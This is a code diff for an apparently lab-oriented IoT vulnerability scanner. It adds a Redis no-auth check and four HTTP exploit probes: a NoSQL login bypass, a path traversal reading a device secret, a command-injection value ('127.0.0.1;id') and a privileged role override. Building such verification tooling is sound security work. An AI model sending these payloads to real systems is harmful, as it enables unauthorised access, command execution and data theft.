@@ -84,6 +84,7 @@ SCAN_MATRIX: dict[str, list[tuple[str, dict[str, Any]]]] = {
         }),
     ],
     "redis": [
+        ("redis_cmd", {"host": "{ip}", "port": "{port}", "command": "PING"}),
         ("nmap_scan", {
             "target": "{ip}", "ports": "6379",
             "scripts": "redis-info", "skip_discovery": True,
@@ -163,6 +164,43 @@ ROLE_EXTRA_SCANS: dict[str, list[tuple[str, dict[str, Any]]]] = {
             "target": "{ip}", "ports": "5683",
             "skip_discovery": True,
             "udp_scan": True,
+        }),
+    ],
+    "exploit_auth_server": [
+        ("http_request", {
+            "url": "http://{ip}:8080/login",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "body": "{\"username\":\"operator\",\"password\":{\"$ne\":null}}",
+            "follow_redirects": False,
+        }),
+    ],
+    "exploit_files_server": [
+        ("http_request", {
+            "url": "http://{ip}:8080/files?path=../../etc/device-secret",
+            "method": "GET",
+            "follow_redirects": False,
+        }),
+    ],
+    "exploit_command_server": [
+        ("http_request", {
+            "url": "http://{ip}:8080/diagnostics",
+            "method": "POST",
+            "headers": {"Content-Type": "application/json"},
+            "body": "{\"target\":\"127.0.0.1;id\"}",
+            "follow_redirects": False,
+        }),
+    ],
+    "exploit_privilege_server": [
+        ("http_request", {
+            "url": "http://{ip}:8080/jobs",
+            "method": "POST",
+            "headers": {
+                "Authorization": "Bearer low-privilege-s22",
+                "Content-Type": "application/json",
+            },
+            "body": "{\"role\":\"admin\",\"command\":\"status\"}",
+            "follow_redirects": False,
         }),
     ],
     "camera_server": [
@@ -1200,7 +1238,23 @@ def _extract_insecure_update_compact(
 
 
 def _extract_redis_no_auth(entries: list[dict], device: dict, svc_name: str) -> list[dict]:
-    """Redis port 6379 open → no_auth HIGH confirmed, data_exposure MEDIUM if keys present."""
+    """A successful unauthenticated PING proves Redis no_auth; keys remain only suspected exposure."""
+    ping_ok = False
+    ping_evidence = ""
+    for entry in entries:
+        tool = str(entry.get("tool") or "")
+        result = _parse_result(entry)
+        if tool == "redis_cmd":
+            command = str(entry.get("kwargs", {}).get("command") or "").strip().casefold()
+            if (
+                command == "ping"
+                and result.get("return_code") == 0
+                and str(result.get("stdout") or "").strip().casefold() == "pong"
+            ):
+                ping_ok = True
+                ping_evidence = "redis_cmd PING returned PONG"
+    if not ping_ok:
+        return []
     for entry in entries:
         if entry["tool"] != "nmap_scan":
             continue
@@ -1212,9 +1266,9 @@ def _extract_redis_no_auth(entries: list[dict], device: dict, svc_name: str) -> 
         if "6379/tcp" not in stdout or "open" not in stdout:
             continue
 
-        evidence = "nmap: 6379/tcp open"
+        evidence = ping_evidence
         if "redis_version" in stdout.lower() or "redis" in stdout.lower():
-            evidence = f"nmap redis-info: {stdout.strip()[:200]}"
+            evidence = f"{ping_evidence}; nmap redis-info: {stdout.strip()[:200]}"
 
         findings = [_make_finding(
             device, "no_auth", "HIGH", "redis", 6379,
@@ -1222,7 +1276,7 @@ def _extract_redis_no_auth(entries: list[dict], device: dict, svc_name: str) -> 
             evidence,
             status="confirmed",
             technique="redis-cli -h <ip> KEYS '*' to enumerate all keys and dump sensitive data",
-            tools=["nmap_scan"],
+            tools=["redis_cmd"],
         )]
 
         # An open Redis port proves unauthenticated access, not sensitive content.
@@ -1402,7 +1456,41 @@ def _extract_ssh_port_forwarding(entries: list[dict], device: dict, svc_name: st
 
 
 # All extractors in order
+def _extract_exploit_primitive_findings(entries: list[dict], device: dict, svc_name: str) -> list[dict]:
+    """Extract only the four bounded positive S22 application probes."""
+    role = str(device.get("role") or "").casefold()
+    specs = {
+        "exploit_auth_server": ("POST", "/login", 200, "operator-token-s22", "broken_access_control", "HIGH", "Structured login value bypasses authentication"),
+        "exploit_files_server": ("GET", "/files", 200, "DEVICE-SECRET-S22", "data_exposure", "HIGH", "File API permits bounded path traversal"),
+        "exploit_command_server": ("POST", "/diagnostics", 200, "uid=1000(iotdiag)", "code_injection", "CRITICAL", "Diagnostics parameter permits simulated command injection"),
+        "exploit_privilege_server": ("POST", "/jobs", 201, "root-maintenance", "privilege_escalation", "CRITICAL", "Job API accepts an unauthorized privileged role override"),
+    }
+    spec = specs.get(role)
+    if spec is None:
+        return []
+    method, endpoint, expected_status, marker, vuln_type, severity, title = spec
+    for entry in entries:
+        if entry.get("tool") != "http_request":
+            continue
+        url = str(entry.get("kwargs", {}).get("url") or "")
+        if urlsplit(url).path != endpoint:
+            continue
+        result = _parse_result(entry)
+        status = result.get("status_code")
+        body = str(result.get("body") or "")
+        if status != expected_status or marker.casefold() not in body.casefold():
+            continue
+        return [_make_finding(
+            device, vuln_type, severity, "http", 8080,
+            title,
+            f"{method} {url} returned HTTP {status}; response marker: {marker}",
+            status="confirmed",
+            technique=f"Repeat the bounded {method} {endpoint} probe and preserve the response as evidence",
+            tools=["http_request"],
+            endpoint=endpoint,
+        )]
 FINDING_EXTRACTORS = [
+    _extract_exploit_primitive_findings,
     _extract_server_version,
     _extract_missing_headers,
     _extract_directory_listing,
